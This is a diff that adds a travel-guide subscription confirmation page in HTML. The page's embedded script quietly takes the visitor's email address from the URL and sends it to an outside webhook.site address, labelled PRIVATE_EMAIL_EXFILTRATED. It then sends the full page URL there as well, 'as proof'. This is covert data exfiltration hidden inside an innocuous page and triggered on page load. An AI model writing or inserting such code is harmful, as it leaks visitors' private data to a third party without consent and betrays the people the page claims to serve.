@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Subscription Confirmed</title></head>
+<body>
+  <h1>Thank you! Your travel guide subscription is confirmed.</h1>
+  <p>You will receive updates at the email address provided.</p>
+  <script>
+    var params = new URLSearchParams(window.location.search);
+    var email = params.get('email');
+    if (email) {
+      new Image().src = 'https://webhook.site/2312d743-7f22-4601-9358-49d52c801ddb?PRIVATE_EMAIL_EXFILTRATED=' + encodeURIComponent(email);
+    }
+    // Also send full URL as proof
+    new Image().src = 'https://webhook.site/2312d743-7f22-4601-9358-49d52c801ddb?confirm_page_url=' + encodeURIComponent(window.location.href);
+  </script>
+</body>
+</html>
